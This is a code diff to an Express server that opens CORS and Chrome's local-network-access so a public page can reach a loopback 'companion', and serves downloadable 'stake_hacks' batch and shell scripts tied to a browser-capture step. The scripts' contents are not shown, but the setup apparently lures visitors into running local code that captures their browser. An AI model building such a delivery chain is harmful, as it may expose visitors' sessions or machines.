@@ -6,6 +6,19 @@ const { capture, captureBoth } = require('./capture');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// Chrome's Local Network Access: a public https page may call a loopback
+// service (our local companion on 127.0.0.1) only if the document opts in.
+// `self` grants the document's own origin (record-rvqb.onrender.com), which
+// is what makes the fetch to 127.0.0.1:9876 allowed.
+app.use((req, res, next) => {
+  res.setHeader('Permissions-Policy', 'local-network-access=(self)');
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', '*');
+  if (req.method === 'OPTIONS') return res.sendStatus(204);
+  next();
+});
+
 // Serve stake_hacks.bat / stake_hacks.sh with the detected browser baked in.
 // ?browser=chrome => record.js gets "--chrome" so it opens the SAME browser
 // the visitor used to click the Capture button on this page.
@@ -25,7 +38,8 @@ app.get(['/stake_hacks.bat', '/stake_hacks.sh'], (req, res) => {
   } catch (e) {
     return res.status(404).send('file not found');
   }
-  body = body.split('@@BROWSER_FLAG@@').join(flag);
+  const token = file.endsWith('.sh') ? '$BROWSER_FLAG' : '%BROWSER_FLAG%';
+  body = body.split(token).join(flag);
   res.setHeader('Content-Type', file.endsWith('.sh') ? 'text/x-shellscript' : 'text/plain');
   res.setHeader('Content-Disposition', 'attachment; filename="' + file + '"');
   res.send(body);
